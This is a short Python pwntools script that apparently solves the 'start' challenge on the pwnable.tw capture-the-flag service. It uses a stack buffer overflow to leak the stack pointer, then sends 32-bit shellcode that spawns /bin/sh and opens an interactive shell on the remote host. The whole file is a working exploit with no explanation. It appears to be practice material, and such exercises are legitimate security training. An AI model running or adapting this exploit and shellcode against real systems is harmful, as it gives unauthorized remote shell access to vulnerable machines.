from pwn import *

#p = process('./start')
p = remote('chall.pwnable.tw',10000)

padding = b'i'*20
payload = padding + p32(0x08048087)

print(p.recvuntil(':'))
p.send(payload)
#p.sendlineafter(":", payload)

tmp = p.recv()
esp = u32(tmp[:4])

log.success("found esp")
log.info(hex(esp))

shellcode = b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x31\xd2\x31\xc9\x31\xd2\x89\xe3\xb0\x0b\xcd\x80\x30\xc0\xfe\xc0\xcd\x80"

payload2 = b'i'*20 + p32(esp+20) + shellcode

p.send(payload2)
p.interactive()
